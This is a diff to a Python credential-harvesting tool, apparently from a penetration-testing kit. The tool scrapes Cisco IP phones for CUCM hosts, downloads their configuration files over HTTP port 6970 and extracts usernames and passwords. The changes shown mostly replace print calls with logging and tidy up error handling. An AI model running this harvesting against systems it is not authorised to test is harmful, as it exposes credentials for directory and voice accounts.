@@ -92,19 +92,17 @@ def search_for_secrets(cucm_hosts, phone_hostname, save_dir):
     if not cucm_host: continue
     url = f'http://{cucm_host}:6970/{config_file}'
     try:
+      log(f'Trying CUCM at {cucm_host}', VERBOSE)
       __http_response = requests.get(url, timeout=3)
       if __http_response.status_code == 404:
-        if verbose:
-          print(f'Config file not found at {url}')
+        log(f'Config file not found at {url}', VERBOSE)
         continue
       else:
         lines = __http_response.text
         if save_dir:
           try:
-            fh = open(os.path.join(save_dir,
-              f'{cucm_host}_{config_file}'), 'w')
-            fh.write(lines)
-            fh.close
+            with open(os.path.join(save_dir, f'{cucm_host}_{config_file}'), 'w') as fh:
+              fh.write(lines)
           except FileNotFoundError as e:
             log(f'Failed saving the conf file {e}', INFO)
 
@@ -122,10 +120,11 @@ def search_for_secrets(cucm_hosts, phone_hostname, save_dir):
         if match.group(5):
           user2 = match.group(5)
           found_credentials.append(('unknown',password,filename))
+    except requests.exceptions.RequestException:
+      log(f'Connection error for: {url}', VERBOSE)
     except Exception as e:
       log(f'Error during secret search at {url}: {e}', VERBOSE)
     else:
-      if not verbose: continue
       if user and password:
         log(f'{config_file}\t{user}\t{password}', VERBOSE)
       elif user:
@@ -135,7 +134,7 @@ def search_for_secrets(cucm_hosts, phone_hostname, save_dir):
       elif user2:
         log(f'Possible AD username {user2} found in config {config_file}', VERBOSE)
       else:
-        print(f'Username and password not set in {config_file}')
+        log(f'Username and password not set in {config_file}', VERBOSE)
       #break
 
 if __name__ == '__main__':
@@ -170,31 +169,32 @@ if __name__ == '__main__':
     phoneips.append(phone)
   else:
     try:
-      phoneips = open(phone).read().split('\n')
+      phoneips = open(phone).read().split('\n')[:-1]
     except FileNotFoundError as e:
       print('Could not open list file', e)
       quit(1)
 
   if not len(phoneips):
-    print('Got nothing to work with, provide a phone IP or a file with a list of addresses')
+    log('Got nothing to work with, provide a phone IP or a file with a list of addresses', INFO)
     quit(1)
 
   for phoneip in phoneips:
     (phone_hostname, cucm_hosts) = scrape_phone(phoneip)
     if not cucm_hosts:
-      print(f'No CUCM hosts found in config for {phoneip}')
+      log(f'No CUCM hosts found in config for {phoneip}', INFO)
       continue
     if not phone_hostname:
-      print(f'No hostname found for {phoneip}')
+      log(f'No hostname found for {phoneip}', INFO)
       continue
+    log(f'Got hostname {phone_hostname} for {phoneip} and CUCM servers {cucm_hosts}', VERBOSE)
     search_for_secrets(cucm_hosts, phone_hostname, save_dir)
 
   if found_credentials != []:
-    print('Credentials Found in Configurations!')
+    log('Credentials Found in Configurations!', INFO)
     for cred in found_credentials:
-      print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
+      log('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]), INFO)
 
   if found_usernames != []:
-    print('Usernames Found in Configurations!')
+    log('Usernames Found in Configurations!', INFO)
     for usernames in found_usernames:
-      print('{0}\t{1}'.format(usernames[0],usernames[1]))
+      log('{0}\t{1}'.format(usernames[0],usernames[1]), INFO)
